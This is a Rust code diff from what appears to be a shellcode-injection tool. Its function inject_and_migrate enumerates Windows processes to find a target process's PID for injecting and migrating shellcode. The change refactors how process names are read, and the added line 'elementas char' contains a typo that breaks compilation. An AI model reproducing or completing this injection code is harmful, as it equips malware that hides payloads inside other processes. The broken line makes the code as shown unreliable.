@@ -1,6 +1,6 @@
 use core::ffi::c_void;
 use std::{mem, ptr};
-use windows::Win32::Foundation::{BOOL, CHAR, HANDLE};
+use windows::Win32::Foundation::{BOOL, HANDLE};
 use windows::Win32::System::Diagnostics::ToolHelp::{
     CREATE_TOOLHELP_SNAPSHOT_FLAGS, PROCESSENTRY32, TH32CS_SNAPPROCESS,
 };
@@ -29,11 +29,10 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     while unsafe { function(snapshot, &mut process_entry).as_bool() } {
         let mut process_name = String::from("");
         for element in process_entry.szExeFile {
-            let element_as_u8 = unsafe { mem::transmute::<CHAR, u8>(element) };
-            if element_as_u8 == 0 {
+            if element == 0 {
                 break;
             }
-            process_name.push(element_as_u8 as char);
+            process_name.push(elementas char);
         }
         if process_name.contains(target_process) {
             pid = process_entry.th32ProcessID;
